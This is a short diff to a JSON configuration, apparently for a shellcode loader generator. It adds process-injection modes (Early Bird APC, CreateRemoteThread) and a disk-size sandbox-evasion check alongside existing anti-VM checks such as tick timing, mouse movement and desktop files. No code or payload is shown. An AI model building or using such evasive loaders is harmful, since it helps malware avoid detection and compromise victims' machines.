@@ -12,14 +12,17 @@
     { "id": "alloc_mem_local", "label": "LocalAlloc", "feature": "alloc_mem_local" }
   ],
   "run_modes": [
-    { "id": "create_thread", "label": "CreateThread 直接执行 (create_thread)", "feature": "run_create_thread" },
-    { "id": "gdi_families", "label": "GDI 家族变种注入 (gdi_families)", "feature": "run_gdi_families" },
-    { "id": "enum_ui", "label": "EnumUILanguagesW 回调执行 (enum_ui)", "feature": "run_enum_ui" }
+    { "id": "create_thread", "label": "CreateThread 直接执行 (create_thread)", "feature": "run_create_thread", "pattern": 1 },
+    { "id": "gdi_families", "label": "GDI 家族变种注入 (gdi_families)", "feature": "run_gdi_families", "pattern": 1 },
+    { "id": "enum_ui", "label": "EnumUILanguagesW 回调执行 (enum_ui)", "feature": "run_enum_ui", "pattern": 1 },
+    { "id": "early_bird_apc", "label": "Early Bird APC 注入 (early_bird_apc)", "feature": "run_early_bird_apc", "pattern": 2 },
+    { "id": "create_remote_thread", "label": "CreateRemoteThread 远程注入 (create_remote_thread)", "feature": "run_create_remote_thread", "pattern": 3 }
   ],
   "vm_checks": [
     { "id": "tick", "label": "Tick检测", "feature": "vm_check_tick" },
     { "id": "mouse", "label": "鼠标轨迹", "feature": "vm_check_mouse" },
-    { "id": "desktop_files", "label": "桌面文件", "feature": "vm_check_desktop_files" }
+    { "id": "desktop_files", "label": "桌面文件", "feature": "vm_check_desktop_files" },
+    { "id": "c_drive", "label": "C盘容量", "feature": "vm_check_c_drive" }
   ],
   "defaults": {
     "encryption": "ipv4",
